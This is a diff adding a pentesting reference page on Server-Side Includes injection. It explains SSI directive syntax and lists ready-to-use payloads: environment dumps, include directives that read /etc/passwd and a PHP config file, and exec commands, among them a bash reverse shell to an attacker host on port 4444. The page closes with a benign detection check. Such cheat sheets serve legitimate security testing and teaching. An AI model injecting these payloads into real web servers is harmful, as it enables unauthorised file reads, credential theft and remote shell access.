@@ -1,0 +1,70 @@
+---
+title: "SSI Injection"
+---
+
+Server-Side Includes (SSI) allow web servers to inject content into HTML pages dynamically before serving them. SSI directives are embedded in HTML files and processed by the server at request time. When user input reaches those directives without sanitisation, an attacker can inject arbitrary SSI commands, leading to information disclosure or remote code execution.
+
+## SSI Directives
+
+SSI directives follow the format `<!--#directive parameter="value" -->`.
+
+| Directive | Description | Example |
+|-----------|-------------|---------|
+| `printenv` | Prints all server environment variables. No parameters. | `<!--#printenv -->` |
+| `echo` | Prints the value of a variable. | `<!--#echo var="DOCUMENT_NAME" -->` |
+| `exec` | Executes a shell command. | `<!--#exec cmd="id" -->` |
+| `include` | Includes a file from the server. | `<!--#include virtual="/etc/passwd" -->` |
+| `config` | Changes SSI configuration (e.g. error message). | `<!--#config errmsg="Error" -->` |
+
+## Common `echo` Variables
+
+```
+<!--#echo var="DATE_LOCAL" -->
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="DOCUMENT_URI" -->
+<!--#echo var="LAST_MODIFIED" -->
+<!--#echo var="SERVER_NAME" -->
+<!--#echo var="SERVER_SOFTWARE" -->
+```
+
+## Exploitation
+
+SSI injection requires a file served by the web server to contain your injected directive. Typical entry points are file names, form fields, or URL parameters that end up reflected in a `.shtml` page or any page processed by `mod_include`.
+
+### Information Disclosure
+
+```html wrap
+<!--#printenv -->
+<!--#echo var="SERVER_SOFTWARE" -->
+<!--#echo var="DOCUMENT_URI" -->
+```
+
+### Local File Read
+
+```html wrap
+<!--#include virtual="/etc/passwd" -->
+<!--#include virtual="/var/www/html/config.php" -->
+```
+
+### Remote Code Execution
+
+```html wrap
+<!--#exec cmd="id" -->
+<!--#exec cmd="whoami" -->
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="/bin/bash -i >& /dev/tcp/$LHOST/4444 0>&1" -->
+```
+
+<Info>
+`exec cmd` requires `Options +Includes` and `SSILegacyExprParser` or equivalent to be enabled in the Apache/nginx config. If `exec` is disabled, escalate through `include` for file reads instead.
+</Info>
+
+## Detection
+
+Test inputs that end up in served HTML by injecting a benign directive and checking if its output appears in the response:
+
+```html wrap
+<!--#echo var="DATE_LOCAL" -->
+```
+
+If the current date appears in the response body instead of the raw directive string, SSI is being processed and injection is confirmed.
